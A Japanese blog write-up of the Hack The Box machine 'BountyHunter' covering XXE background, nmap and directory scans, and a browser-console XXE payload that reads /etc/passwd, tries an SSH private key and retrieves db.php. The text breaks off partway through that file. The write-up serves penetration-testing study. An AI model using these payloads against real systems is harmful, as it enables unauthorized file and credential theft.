{"componentChunkName":"component---src-templates-post-template-js","path":"/hackthebox-linux-bugbountyhunter","result":{"data":{"markdownRemark":{"id":"556ce09e-8ef9-53fe-b0d9-78c7915a5dab","html":"<p>「Hack The Box」という、ペネトレーションテストの学習プラットフォームを利用してセキュリティについて学んでいます。\n「Hack The Box」のランクは、本記事執筆時点でProHackerです。</p>\n<img src=\"http://www.hackthebox.eu/badge/image/327080\" alt=\"Hack The Box\">\n<p>今回は、HackTheBoxのリタイアマシン「BountyHunter」のWriteUpです。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/4d74412dfc7fdf1fe92e7b15531b03fb/0b533/image-11.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 73.75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAAC80lEQVQ4y21TW0tUURidJy1Lx7k4l3Obc937nDnnzN1Ry9RUrHzwISSNICGIxC4zZDovGhQECiIUBlIvRX8j6Kf0I/oBq2+fcUzNh4/znc3ea69vrbVjiTzHcI5BfM9WtCZxDI0wXEs4SGkcBZPDcl2odhGaFUDWA0gFH1nNg2ZzeH4JsUSe0WEBwv4DG0wxSF4Rdx7XsPS0hkqzCNVgUDwBEBJgGIHmTA+KQ4COKwDPMzxllqaDvo+jb6M43F9Bp7WI4+MqGjcDKAViy0uQialMTCXDhW0xcLrsUoYpAuxLMqysVvHnnYPPHxfR2prE746JF2tVKGJ814fEXeRsFxoBcpKD00WXAiYJsJ8AH63V8GvzLnb2F/DlxxJ+Hi1hY30MWZVGZEXkaMyc5RJTDxL1ssnPj9z7JmXSL+nAHg/w4esy3h88xPeDB9jbm0NtoYZ0jgDdIrI2Q4H5sL0SdB6QDME/hj2weNaJKiW7kY7BZICVzXGsthuoz5YhF8LIWZWFMIplAqOi3mIlWE54nqEAyhYCqhD9cQ0DKR1X4xYGkiY5GyJDl6iklxg5LTuQaWyDh6Shh7zqQtJOXBYsBaO+uIq5e8s4/HSMJ8/aUbW3drHxqoPt3bdYf/0Sz1stvOnsoL3dQTh6C3kyQjeLyEg2ZBEbwa47MkUl40AyK6iOzUdVbs7Br01hav4+THcClYkZ1Ken0ZyZRfP2LBSRRTJEdSg+zEWe+phwNK2ykyK2so3rGZ2qgMFsAVfiJvS6BOeGgv4hE8OygbRuImNZJAOH6pHL9HpyZjchMRHilMLI2W6lFHGBixFRpEmCHNXLNoyqFfUj9MxSinu6L+plHv0L6WI9MzJaSGaUon44y+gF1GF4ExTgJuIZcnyEcmZXobkNpBWf5LGRNyq0Z5zi0qTzpcjcU0CdN2B6zdPYKHQ4bMzA9sdpoxNpnNZsaKFxJrcOnGACVnEsOtMd+UL+eq8lTuuCxb+1rnnxLMfFqPX2iLW/rJS60yP3hHcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4d74412dfc7fdf1fe92e7b15531b03fb/8ac56/image-11.webp 240w,\n/static/4d74412dfc7fdf1fe92e7b15531b03fb/d3be9/image-11.webp 480w,\n/static/4d74412dfc7fdf1fe92e7b15531b03fb/b0a15/image-11.webp 500w\"\n              sizes=\"(max-width: 500px) 100vw, 500px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4d74412dfc7fdf1fe92e7b15531b03fb/8ff5a/image-11.png 240w,\n/static/4d74412dfc7fdf1fe92e7b15531b03fb/e85cb/image-11.png 480w,\n/static/4d74412dfc7fdf1fe92e7b15531b03fb/0b533/image-11.png 500w\"\n            sizes=\"(max-width: 500px) 100vw, 500px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4d74412dfc7fdf1fe92e7b15531b03fb/0b533/image-11.png\"\n            alt=\"image-11.png\"\n            title=\"image-11.png\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<!-- omit in toc -->\n<h2 id=\"本記事について\" style=\"position:relative;\"><a href=\"#%E6%9C%AC%E8%A8%98%E4%BA%8B%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6\" aria-label=\"本記事について permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>本記事について</h2>\n<p><strong>本記事の内容は社会秩序に反する行為を推奨することを目的としたものではございません。</strong></p>\n<p>自身の所有する環境、もしくは許可された環境以外への攻撃の試行は、「不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）」に違反する可能性があること、予めご留意ください。</p>\n<p>またすべての発言は所属団体ではなく個人に帰属します。</p>\n<!-- omit in toc -->\n<h2 id=\"もくじ\" style=\"position:relative;\"><a href=\"#%E3%82%82%E3%81%8F%E3%81%98\" aria-label=\"もくじ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>もくじ</h2>\n<ul>\n<li>\n<p><a href=\"#xxexml%E5%A4%96%E9%83%A8%E5%AE%9F%E4%BD%93%E5%8F%82%E7%85%A7\">XXE(XML外部実体参照)</a></p>\n<ul>\n<li><a href=\"#dtd\">DTD</a></li>\n</ul>\n</li>\n<li><a href=\"#%E6%8E%A2%E7%B4%A2\">探索</a></li>\n<li><a href=\"#xxe%E3%81%AE%E6%82%AA%E7%94%A8\">XXEの悪用</a></li>\n<li>\n<p><a href=\"#%E6%A8%A9%E9%99%90%E6%98%87%E6%A0%BC\">権限昇格</a></p>\n<ul>\n<li><a href=\"#ticketvalidatorpy\">ticketValidator.py</a></li>\n</ul>\n</li>\n<li><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\">まとめ</a></li>\n</ul>\n<h2 id=\"xxexml外部実体参照\" style=\"position:relative;\"><a href=\"#xxexml%E5%A4%96%E9%83%A8%E5%AE%9F%E4%BD%93%E5%8F%82%E7%85%A7\" aria-label=\"xxexml外部実体参照 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XXE(XML外部実体参照)</h2>\n<p>Flag取得の手順の前に、今回最初に使用するXXEについて概要をまとめます。</p>\n<p> XXEは<code class=\"language-text\">XML External Entity</code>の略称でありXMLの外部実体参照を悪用する脆弱性です。</p>\n<p>XXEを悪用することで、サーバ内のファイルの取得や情報収集、SSRF攻撃など様々な攻撃に利用できます。</p>\n<p>参考：<a href=\"https://www.mbsd.jp/blog/20171130.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">XXE攻撃 基本編 | MBSD Blog</a></p>\n<p>参考：<a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">XML External Entity (XXE) Processing | OWASP</a></p>\n<p>参考：<a href=\"https://amzn.to/3cKRReL\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">体系的に学ぶ 安全なWebアプリケーションの作り方 第2版</a></p>\n<h3 id=\"dtd\" style=\"position:relative;\"><a href=\"#dtd\" aria-label=\"dtd permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DTD</h3>\n<p>DTDはXMLで定義されるスキーマを意味しXMLファイルの構造を定義することができます。</p>\n<p><code class=\"language-text\">&lt;!ENTITY</code>を用いることで実体参照を呼び出すことができ、文字列の置換や、外部ファイルの内容を埋め込むことができます。</p>\n<p>参考：<a href=\"https://atmarkit.itmedia.co.jp/aig/01xml/dtd.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">XML用語事典 [DTD (Document Type Definition)]</a></p>\n<p>参考：<a href=\"https://ja.wikipedia.org/wiki/Document_Type_Definition\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Document Type Definition - Wikipedia</a></p>\n<h2 id=\"探索\" style=\"position:relative;\"><a href=\"#%E6%8E%A2%E7%B4%A2\" aria-label=\"探索 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>探索</h2>\n<p>とりあえずnmapをかけます。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Starting Nmap <span class=\"token number\">7.92</span> <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2021</span>-11-25 <span class=\"token number\">18</span>:26 JST\nNmap scan report <span class=\"token keyword\">for</span> targethost.htb <span class=\"token punctuation\">(</span><span class=\"token number\">10.10</span>.11.100<span class=\"token punctuation\">)</span>\nHost is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.54s latency<span class=\"token punctuation\">)</span>.\nNot shown: <span class=\"token number\">998</span> closed tcp ports <span class=\"token punctuation\">(</span>conn-refused<span class=\"token punctuation\">)</span>\nPORT   STATE SERVICE VERSION\n<span class=\"token number\">22</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">8</span>.2p1 Ubuntu 4ubuntu0.2 <span class=\"token punctuation\">(</span>Ubuntu Linux<span class=\"token punctuation\">;</span> protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span> ssh-hostkey: \n<span class=\"token operator\">|</span>   <span class=\"token number\">3072</span> d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 <span class=\"token punctuation\">(</span>RSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>   <span class=\"token number\">256</span> a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 <span class=\"token punctuation\">(</span>ED25519<span class=\"token punctuation\">)</span>\n<span class=\"token number\">80</span>/tcp <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.4</span>.41 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Ubuntu<span class=\"token punctuation\">))</span></span>\n<span class=\"token operator\">|</span>_http-title: Bounty Hunters\n<span class=\"token operator\">|</span>_http-server-header: Apache/2.4.41 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\nService Info: OS: Linux<span class=\"token punctuation\">;</span> CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class=\"token builtin class-name\">.</span>\nNmap done: <span class=\"token number\">1</span> IP address <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token function\">host</span> up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">178.60</span> seconds</code></pre></div>\n<p>80番ポートが開いているのでWEBアクセスし、探索すると、以下のようなフォームが見つかります。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/b7aeade27c357723437385e55a8a6a33/0b533/image-12.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.91666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAARlAAAEZQAGA43XUAAAA2UlEQVQoz6WQaQtEUBSG/f//JMr4oAjZxohQCmlsg8gy71zNmtHUPB9up9N57lmovu8FQbAsS9d113VN05Rl+Ug4EZCUJCnLsjAMUYkMlIVAIeJ5/kBAkaZpHMfRNK2qqm3boigqisIwjOd5vu+zLAu/bVuY8zxTyztIjeM4DMM0TYiXXW7ydAdxHMdogiGLomia5kKoqmr961H2lF+B7DhOFEVJksA/E/I835ziU07TNAgCrIf+uFBZluhf1/VPMhbGYHgNw8Cpuq5b9/q68ybrevs3o5Y/uAJhSAFDJhazjgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b7aeade27c357723437385e55a8a6a33/8ac56/image-12.webp 240w,\n/static/b7aeade27c357723437385e55a8a6a33/d3be9/image-12.webp 480w,\n/static/b7aeade27c357723437385e55a8a6a33/b0a15/image-12.webp 500w\"\n              sizes=\"(max-width: 500px) 100vw, 500px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b7aeade27c357723437385e55a8a6a33/8ff5a/image-12.png 240w,\n/static/b7aeade27c357723437385e55a8a6a33/e85cb/image-12.png 480w,\n/static/b7aeade27c357723437385e55a8a6a33/0b533/image-12.png 500w\"\n            sizes=\"(max-width: 500px) 100vw, 500px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b7aeade27c357723437385e55a8a6a33/0b533/image-12.png\"\n            alt=\"image-12.png\"\n            title=\"image-12.png\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>ついでにferoxbusterを使ってディレクトリの探索も仕掛けます。</p>\n<p>バックエンドはPHPのようなので、オプションはPHPを指定しています。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">feroxbuster -u http://targethost.htb/ -x php -w /usr/share/wordlists/raft-medium-directories.txt --no-recursion <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> feroxbuster.txt\n\n<span class=\"token number\">301</span>        9l       28w      313c http://targethost.htb/js\n<span class=\"token number\">301</span>        9l       28w      314c http://targethost.htb/css\n<span class=\"token number\">301</span>        9l       28w      317c http://targethost.htb/assets\n<span class=\"token number\">200</span>        0l        0w        0c http://targethost.htb/db.php\n<span class=\"token number\">301</span>        9l       28w      320c http://targethost.htb/resources\n<span class=\"token number\">200</span>      388l     1470w        0c http://targethost.htb/index.php\n<span class=\"token number\">200</span>        5l       15w      125c http://targethost.htb/portal.php</code></pre></div>\n<p>フォームのスクリプトを見ると、各入力値をもとにXML文を作成し、Base64エンコーディングした上で<code class=\"language-text\">/tracker_diRbPr00f314.php</code>にPOST送信しているようです。（実際に送信する文字列はBase64されたものをさらに改変してそうなのですが、どこで何をしているのかわからず。）</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">returnSecret</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">return</span> Promise<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>$<span class=\"token punctuation\">.</span><span class=\"token function\">ajax</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n            <span class=\"token literal-property property\">type</span><span class=\"token operator\">:</span> <span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token literal-property property\">data</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><span class=\"token string-property property\">\"data\"</span><span class=\"token operator\">:</span>data<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token literal-property property\">url</span><span class=\"token operator\">:</span> <span class=\"token string\">\"tracker_diRbPr00f314.php\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">bountySubmit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">var</span> xml <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;?xml  version=\"1.0\" encoding=\"ISO-8859-1\"?>\n\t\t&lt;bugreport>\n\t\t&lt;title></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#exploitTitle'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">val</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">&lt;/title>\n\t\t&lt;cwe></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#cwe'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">val</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">&lt;/cwe>\n\t\t&lt;cvss></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#cvss'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">val</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">&lt;/cvss>\n\t\t&lt;reward></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#reward'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">val</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">&lt;/reward>\n\t\t&lt;/bugreport></span><span class=\"token template-punctuation string\">`</span></span>\n\t\t<span class=\"token keyword\">let</span> data <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">returnSecret</span><span class=\"token punctuation\">(</span><span class=\"token function\">btoa</span><span class=\"token punctuation\">(</span>xml<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \t\t<span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#return\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">html</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\tconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Error:'</span><span class=\"token punctuation\">,</span> error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>とりあえずXXEが使えそうなので、次から色々試してみます。</p>\n<h2 id=\"xxeの悪用\" style=\"position:relative;\"><a href=\"#xxe%E3%81%AE%E6%82%AA%E7%94%A8\" aria-label=\"xxeの悪用 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XXEの悪用</h2>\n<p>Googleコンソールから、スクリプトを以下のように改変してフォームを実行します。</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">bountySubmit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">var</span> xml <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;?xml  version=\"1.0\" encoding=\"ISO-8859-1\"?>\n\t\t&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">] > \n\t\t&lt;bugreport>\n\t\t&lt;title>&amp;xxe;&lt;/title>\n\t\t&lt;cwe></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#cwe'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">val</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">&lt;/cwe>\n\t\t&lt;cvss></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#cvss'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">val</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">&lt;/cvss>\n\t\t&lt;reward></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#reward'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">val</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">&lt;/reward>\n\t\t&lt;/bugreport></span><span class=\"token template-punctuation string\">`</span></span>\n\t\t<span class=\"token keyword\">let</span> data <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">returnSecret</span><span class=\"token punctuation\">(</span><span class=\"token function\">btoa</span><span class=\"token punctuation\">(</span>xml<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \t\t<span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#return\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">html</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\tconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Error:'</span><span class=\"token punctuation\">,</span> error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>これで<code class=\"language-text\">title</code>要素にBase64エンコーディングされたpasswdが返ってきます。</p>\n<p>一般ユーザの名前を見ると<code class=\"language-text\">development</code>となっていたので、以下のようなXXEでユーザフラグや秘密鍵が取れないか試してみたのですが、残念ながら失敗しました。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span>DOCTYPE foo <span class=\"token punctuation\">[</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span>ENTITY xxe SYSTEM <span class=\"token string\">\"php://filter/convert.base64-encode/resource=/home/development/user.txt\"</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span>DOCTYPE foo <span class=\"token punctuation\">[</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span>ENTITY xxe SYSTEM <span class=\"token string\">\"php://filter/convert.base64-encode/resource=/home/development/Desktop/user.txt\"</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span>DOCTYPE foo <span class=\"token punctuation\">[</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span>ENTITY xxe SYSTEM <span class=\"token string\">\"php://filter/convert.base64-encode/resource=/home/development/.ssh/id_rsa\"</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span></code></pre></div>\n<p>そこで、サーバ内で稼働している他のファイルの情報を取得していくことにしました。</p>\n<p>先ほどのfeloxbusterの結果から、<code class=\"language-text\">db.php</code>というファイルが怪しそうです。</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"># &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=db.php\">]\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">// TODO -> Implement login system with the database.</span>\n<span class=\"token variable\">$dbserver</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"localhost\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token 